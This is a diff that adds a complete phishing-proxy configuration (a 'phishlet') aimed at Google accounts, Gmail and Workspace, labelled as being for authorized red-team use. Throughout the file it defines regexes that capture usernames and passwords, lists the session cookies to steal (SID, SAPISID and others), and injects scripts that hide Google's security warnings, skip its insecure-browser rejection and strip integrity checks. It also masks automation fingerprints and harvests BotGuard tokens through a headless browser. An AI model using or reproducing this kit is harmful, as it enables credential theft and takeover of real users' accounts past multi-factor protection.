@@ -1,0 +1,422 @@
+# Google Super Phishlet - Merged Google + Gmail with Browser Detection Evasion
+# For red team and authorized penetration testing only
+# Author: ∆N0M∆LY & Red-Queen Team
+# Version: 3.0.0 - December 2024
+
+name: 'Google'
+author: 'red-queen'
+min_ver: '3.0.0'
+
+# Super phishlet combining Google Account + Gmail functionality
+# Supports: Google accounts, Gmail, GSuite, Google Workspace, Drive, Meet, Chat
+
+proxy_hosts:
+  #===============================================================================
+  # GOOGLE CORE
+  #===============================================================================
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  
+  #===============================================================================
+  # GMAIL / WORKSPACE
+  #===============================================================================
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'inbox', orig_sub: 'inbox', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'chat', orig_sub: 'chat', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'meet', orig_sub: 'meet', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'drive', orig_sub: 'drive', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'docs', orig_sub: 'docs', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'calendar', orig_sub: 'calendar', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'contacts', orig_sub: 'contacts', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  
+  #===============================================================================
+  # OTHER GOOGLE SERVICES
+  #===============================================================================
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'photos', orig_sub: 'photos', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'keep', orig_sub: 'keep', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'admin', orig_sub: 'admin', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'workspace', orig_sub: 'workspace', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  
+  #===============================================================================
+  # STATIC / CDN
+  #===============================================================================
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'signaler-pa', orig_sub: 'signaler-pa', domain: 'clients6.google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  #===============================================================================
+  # LOGIN SUCCESS DETECTION & REDIRECT
+  #===============================================================================
+  - triggers_on: 'accounts.google.com'
+    orig_sub: 'accounts'
+    domain: 'google.com'
+    search: '</body>'
+    replace: |
+      <script>
+      (function(){
+        var redirectCount = 0;
+        var maxRedirects = 10;
+        var targetDomain = "{redirect_url}" !== "" ? "{redirect_url}" : "https://myaccount.google.com/";
+        var animationId;
+        
+        function checkCookies() {
+          if (document.cookie.includes("SID") && document.cookie.includes("APISID") && document.cookie.includes("SAPISID")) {
+            cancelAnimationFrame(animationId);
+            setTimeout(function() {
+              window.location.href = targetDomain;
+            }, 1500);
+          } else {
+            redirectCount++;
+            if (redirectCount >= maxRedirects) {
+              cancelAnimationFrame(animationId);
+            }
+          }
+        }
+        
+        document.addEventListener("DOMContentLoaded", function() {
+          checkCookies();
+          animationId = requestAnimationFrame(function e() {
+            checkCookies();
+            animationId = requestAnimationFrame(e);
+          });
+        });
+      })();
+      </script></body>
+    mimes: ['text/html', 'application/json']
+
+  #===============================================================================
+  # BROWSER SECURITY BYPASS
+  #===============================================================================
+  - triggers_on: 'accounts.google.com'
+    orig_sub: 'accounts'
+    domain: 'google.com'
+    search: '</body>'
+    replace: |
+      <script>
+      (function(){
+        function checkAndBypass(){
+          var t = document.body.textContent || document.body.innerText;
+          var rejected = window.location.href.includes("v3/signin/rejected");
+          if ((t.includes("This browser or app may not be secure.") || 
+               t.includes("Couldn't sign you in") || 
+               t.includes("browser doesn't support")) && rejected) {
+            window.location.href = "/";
+          }
+        }
+        document.addEventListener("DOMContentLoaded", checkAndBypass);
+        window.addEventListener("load", checkAndBypass);
+        setTimeout(checkAndBypass, 2000);
+        setTimeout(checkAndBypass, 5000);
+      })();
+      </script></body>
+    mimes: ['text/html', 'application/json']
+
+  #===============================================================================
+  # PASSWORD RESET HANDLER
+  #===============================================================================
+  - triggers_on: 'accounts.google.com'
+    orig_sub: 'accounts'
+    domain: 'google.com'
+    search: '</body>'
+    replace: |
+      <script>
+      (function(){
+        var isListenerAdded = false;
+        var intervalID = setInterval(function() {
+          if (!document.body.innerText.includes("You can update your password now if you forgot it.")) {
+            isListenerAdded = true;
+          } else if (window.location.href.includes("/changepassword")) {
+            var button = document.querySelectorAll('button[type="button"]')[1];
+            if (button && button.innerText === "Update password") {
+              button.addEventListener("click", function() {
+                if (window.location.href.includes("/changepassword")) {
+                  setTimeout(function() { location.reload(); }, 2000);
+                }
+              });
+              isListenerAdded = true;
+            }
+          }
+          if (isListenerAdded) {
+            clearInterval(intervalID);
+          }
+        }, 500);
+      })();
+      </script></body>
+    mimes: ['text/html', 'application/json']
+
+  #===============================================================================
+  # DOMAIN REPLACEMENTS
+  #===============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'drive.google.com', orig_sub: 'drive', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'meet.google.com', orig_sub: 'meet', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'chat.google.com', orig_sub: 'chat', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+
+  #===============================================================================
+  # HIDE SECURITY ALERTS & ALT SIGNIN OPTIONS
+  #===============================================================================
+  - triggers_on: 'accounts.google.com'
+    orig_sub: 'accounts'
+    domain: 'google.com'
+    search: '</head>'
+    replace: |
+      <style>
+      #artdeco-global-alert-container { display: none !important; }
+      .alternate-signin-container { display: none !important; }
+      [data-challengetype="6"] { display: none !important; }
+      [data-challengetype="12"] { display: none !important; }
+      .fFW7wc-ibnC6b { display: none !important; }
+      .device-trust-warning { display: none !important; }
+      .security-warning-banner { display: none !important; }
+      </style></head>
+    mimes: ['text/html']
+
+  #===============================================================================
+  # CROSSORIGIN/INTEGRITY BYPASS
+  #===============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: 'crossorigin', replace: 'xorigin', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: 'integrity', replace: 'xintegrity', mimes: ['text/html', 'application/javascript']}
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID', 'OGPC', 'OGP', '1P_JAR', 'CONSENT', 'SMSV', 'user_id', 'SEARCH_SAMESITE', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID', '.*,regexp']
+  - domain: 'accounts.google.com'
+    keys: ['GAPS', 'LSID', '_utmt', 'utmz', '_utmb', 'ACCOUNT_CHOOSER', '__Host-GAPS', '.*,regexp']
+  - domain: 'mail.google.com'
+    keys: ['GMAIL_AT', 'COMPASS', '.*,regexp']
+  - domain: '.youtube.com'
+    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'LOGIN_INFO', 'PREF', 'VISITOR_INFO1_LIVE', '.*,regexp']
+
+auth_urls:
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/CheckCookie'
+  - '/ManageAccount'
+  - '/'
+  - '/signin/challenge'
+  - '/signin/v2/challenge'
+  - '/signin/v2/identifier'
+  - '/mail/'
+  - '/mail/u/0/'
+  - '/ServiceLogin'
+  - '/o/oauth2/v2/auth'
+  - '/token'
+
+credentials:
+  username:
+    key: ''
+    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"'
+    type: 'post'
+  password:
+    key: ''
+    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
+    type: 'post'
+  custom:
+    - key: 'f.req'
+      search: '\["gf.siecp","([^"]*)"\]'
+      type: 'post'
+    - key: 'identifier'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Passwd'
+      search: '(.*)'
+      type: 'post'
+
+force_post:
+  - path: '/selectchallenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
+    type: 'post'
+
+  - path: '/speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
+    type: 'post'
+
+  - path: '/ServiceLogin'
+    search:
+      - {key: 'service', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
+    type: 'post'
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+js_inject:
+  #===============================================================================
+  # MAIN LOGIN HANDLER
+  #===============================================================================
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['/', '/signin', '/ServiceLogin', '/signin/v2/identifier', '/v3/signin/identifier', '/changepassword']
+    script: |
+      (function(){
+        // Dynamic redirect based on config or default to mail
+        var redirectCount = 0;
+        var maxRedirects = 10;
+        var targetDomain = 'https://mail.google.com/mail/u/0/';
+        var animationId;
+        
+        function checkCookies() {
+          if (document.cookie.includes('SID') && document.cookie.includes('APISID') && document.cookie.includes('SAPISID')) {
+            cancelAnimationFrame(animationId);
+            setTimeout(function() {
+              window.location.href = targetDomain;
+            }, 1500);
+          } else {
+            redirectCount++;
+            if (redirectCount >= maxRedirects) {
+              cancelAnimationFrame(animationId);
+            }
+          }
+        }
+        
+        document.addEventListener('DOMContentLoaded', function() {
+          checkCookies();
+          animationId = requestAnimationFrame(function repeat() {
+            checkCookies();
+            animationId = requestAnimationFrame(repeat);
+          });
+        });
+        
+        // Navigator / browser fingerprint masking
+        try {
+          Object.defineProperty(navigator, 'webdriver', { get: () => false });
+          Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
+          Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
+          
+          // Override automation detection
+          window.chrome = { runtime: {} };
+          
+          // Remove automation indicators
+          delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
+          delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
+          delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
+        } catch(e) {}
+      })();
+
+  #===============================================================================
+  # GMAIL SPECIFIC
+  #===============================================================================
+  - trigger_domains: ['mail.google.com']
+    trigger_paths: ['/mail/*']
+    script: |
+      // Gmail session persistence
+      (function(){
+        console.log('[Google-Super] Gmail loaded');
+        
+        // Extract GMAIL_AT token if present
+        function extractGmailToken() {
+          const scripts = document.getElementsByTagName('script');
+          for (let s of scripts) {
+            const match = s.textContent.match(/GMAIL_AT["']?\s*[:=]\s*["']([^"']+)/);
+            if (match) {
+              console.log('[Google-Super] GMAIL_AT captured');
+              window.__gmailAt = match[1];
+              return match[1];
+            }
+          }
+          return null;
+        }
+        
+        setTimeout(extractGmailToken, 2000);
+      })();
+
+#===============================================================================
+# EVILPUPPET - BOTGUARD TOKEN BYPASS
+#===============================================================================
+evilpuppet:
+  enabled: true
+  
+  triggers:
+    - name: "google_botguard"
+      domains: ['accounts.google.com']
+      paths: ['/v3/signin/_/AccountsSignInUi/data/batchexecute', '/signin/*']
+      token_type: 'botguard'
+      open_url: 'https://accounts.google.com/'
+      actions:
+        - selector: '#identifierId'
+          value: '{username}'
+          enter: false
+          click: false
+          post_wait: 500
+        - selector: '#identifierNext button'
+          click: true
+          post_wait: 2000
+      extraction:
+        type: "script"
+        script: |
+          async function extract() {
+            // Wait for botguard to initialize
+            await new Promise(r => setTimeout(r, 3000));
+            
+            // Try to extract from window object
+            if (window.botguard && window.botguard.bg) {
+              return { token: window.botguard.bg, source: 'window' };
+            }
+            
+            // Check for bg token in hidden inputs
+            const bgInput = document.querySelector('[name="bgresponse"], [name="bgresponsetoken"]');
+            if (bgInput && bgInput.value) {
+              return { token: bgInput.value, source: 'input' };
+            }
+            
+            // Check localStorage
+            const bgLocal = localStorage.getItem('bgresponse');
+            if (bgLocal) {
+              return { token: bgLocal, source: 'localStorage' };
+            }
+            
+            return { error: 'botguard token not found' };
+          }
+          return extract();
+      inject_as: "post_field"
+      inject_name: "bgresponse"
+
+  interceptors:
+    - token: 'botguard'
+      url_re: '/v3/signin/_/AccountsSignInUi/data/batchexecute.*rpcids=V1UmUe'
+      post_re: 'identity-signin-identifier\\",\\"([^"]+)'
+      abort: true
+
+  browser:
+    headless: true
+    stealth: true
+    timeout: 30000
+    viewport:
+      width: 1920
+      height: 1080
+    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
